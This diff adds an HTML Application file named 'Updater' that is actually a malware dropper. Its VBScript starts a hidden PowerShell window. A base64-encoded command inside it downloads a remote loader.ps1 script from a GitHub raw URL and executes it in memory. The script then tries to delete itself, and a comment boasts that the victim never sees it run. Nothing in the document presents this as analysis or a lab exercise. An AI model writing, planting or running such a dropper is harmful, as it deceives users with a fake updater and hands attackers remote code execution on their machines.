@@ -1,0 +1,17 @@
+<html>
+  <head>
+    <title>Updater</title>
+    <script language="VBScript">
+      ' === In-memory PowerShell stub ===
+      Dim sh: Set sh = CreateObject("WScript.Shell")
+      sh.Run "powershell -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA", 0, False
+
+      ' Optional: self-delete the HTA after execution
+      Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
+      fso.DeleteFile WScript.ScriptFullName, True
+    </script>
+  </head>
+  <body>
+    <!-- Empty—they never see this—mshta.exe runs in the background -->
+  </body>
+</html>
